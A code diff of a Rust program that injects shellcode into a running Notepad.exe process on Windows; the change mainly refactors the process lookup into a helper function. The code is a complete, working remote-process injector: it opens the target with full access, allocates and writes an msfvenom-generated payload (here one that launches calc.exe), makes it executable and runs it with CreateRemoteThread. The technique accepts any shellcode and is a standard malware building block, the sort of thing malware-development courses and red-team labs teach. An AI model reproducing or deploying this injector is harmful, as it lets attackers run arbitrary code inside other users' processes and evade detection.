@@ -4,18 +4,42 @@ use std::{
     ptr::{null, null_mut},
 };
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::Win32::Foundation::CloseHandle;
-use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-use windows::Win32::System::Memory::{
-    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+use windows::Win32::{
+    Foundation::{CloseHandle, HANDLE},
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{
+            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+        },
+        Threading::{
+            CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+        },
+    },
 };
-use windows::Win32::System::Threading::{
-    CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
-};
+
+fn find_process(name: &str) -> Result<HANDLE, String> {
+    let mut system = System::new_all();
+    system.refresh_all();
+
+    for (pid, process) in system.processes() {
+        if process.name() == name {
+            let pid = pid.as_u32();
+            let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
+            if hprocess.is_err() {
+                return Err(String::from(format!(
+                    "Failed to open process with PID: {pid}"
+                )));
+            } else {
+                return Ok(hprocess.unwrap());
+            }
+        }
+    }
+
+    return Err(String::from("Process not found"));
+}
 
 fn main() {
-
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let buf: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -39,89 +63,65 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
 
-    let target_name = "Notepad.exe"; // Put the name of the process
+    let h_process = find_process("Notepad.exe").unwrap_or_else(|e| {
+        panic!("[!] find_process Failed With Error: {e}");
+    });
 
-    // Store information about the system the program is running on
-    let mut system = System::new_all();
+    unsafe {
+        println!("[i] Allocating Memory in the Process");
+        let address = VirtualAllocEx(
+            h_process,
+            Some(null_mut()),
+            buf.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
 
-    // Up-to-date system information such as CPU usage, memory usage, information about running processes, and more
-    system.refresh_all();
-
-    // Fetching the process PID
-    for (pid, process) in system.processes() {
-        if process.name() == target_name {
-            let pid_u32 = pid.as_u32();
-            unsafe {
-                println!("[i] Trying to open a Handle for the Process");
-                match OpenProcess(PROCESS_ALL_ACCESS, false, pid_u32) {
-                    Ok(hprocess) => {
-                        println!("[i] Allocating Memory in the Process");
-                        let haddr = VirtualAllocEx(
-                            hprocess,
-                            Some(null_mut()),
-                            buf.len(),
-                            MEM_COMMIT | MEM_RESERVE,
-                            PAGE_READWRITE,
-                        );
-
-                        if haddr.is_null() {
-                            eprintln!("[!] Failed to Allocate Memory in Target Process.");
-                            CloseHandle(hprocess);
-                            exit(-1)
-                        }
-
-                        println!("[i] Writing to memory");
-                        WriteProcessMemory(hprocess, haddr, buf.as_ptr() as _, buf.len(), None)
-                            .unwrap_or_else(|e| {
-                                eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
-                                CloseHandle(hprocess);
-                                exit(-1);
-                            });
-
-                        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-                        VirtualProtectEx(
-                            hprocess,
-                            haddr,
-                            buf.len(),
-                            PAGE_EXECUTE_READWRITE,
-                            &mut oldprotect,
-                        )
-                        .unwrap_or_else(|e| {
-                            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
-                            CloseHandle(hprocess);
-                            exit(-1);
-                        });
-
-                        println!("[+] Creating a Remote Thread");
-                        let hthread = CreateRemoteThread(
-                            hprocess,
-                            Some(null()),
-                            0,
-                            Some(transmute(haddr)),
-                            Some(null()),
-                            0,
-                            Some(null_mut()),
-                        )
-                        .unwrap_or_else(|e| {
-                            eprintln!("[!] CreateRemoteThread Failed With Error: {}", e);
-                            CloseHandle(hprocess);
-                            exit(-1);
-                        });
-                        
-                        println!("[+] Executed!!");
-                        WaitForSingleObject(hthread, INFINITE);
-
-                        CloseHandle(hprocess);
-                        CloseHandle(hthread);
-
- 
-                        break;
-                    }
-                    Err(pid) => {
-                        eprintln!("[!] Error Getting Process Identifier {pid}");
-                    }
-                }
-            }
+        if address.is_null() {
+            eprintln!("[!] Failed to Allocate Memory in Target Process.");
+            CloseHandle(h_process);
+            exit(-1)
         }
+
+        println!("[i] Writing to memory");
+        WriteProcessMemory(h_process, address, buf.as_ptr() as _, buf.len(), None).unwrap_or_else(|e| {
+            eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
+            CloseHandle(h_process);
+            exit(-1);
+        });
+
+        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+        VirtualProtectEx(
+            h_process,
+            address,
+            buf.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut oldprotect,
+        ).unwrap_or_else(|e| {
+            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
+            CloseHandle(h_process);
+            exit(-1);
+        });
+
+        println!("[+] Creating a Remote Thread");
+        let h_thread = CreateRemoteThread(
+            h_process,
+            Some(null()),
+            0,
+            Some(transmute(address)),
+            Some(null()),
+            0,
+            Some(null_mut()),
+        ).unwrap_or_else(|e| {
+            eprintln!("[!] CreateRemoteThread Failed With Error: {}", e);
+            CloseHandle(h_process);
+            exit(-1);
+        });
+
+        println!("[+] Executed!!");
+        WaitForSingleObject(h_thread, INFINITE);
+
+        CloseHandle(h_process);
+        CloseHandle(h_thread);
     }
 }
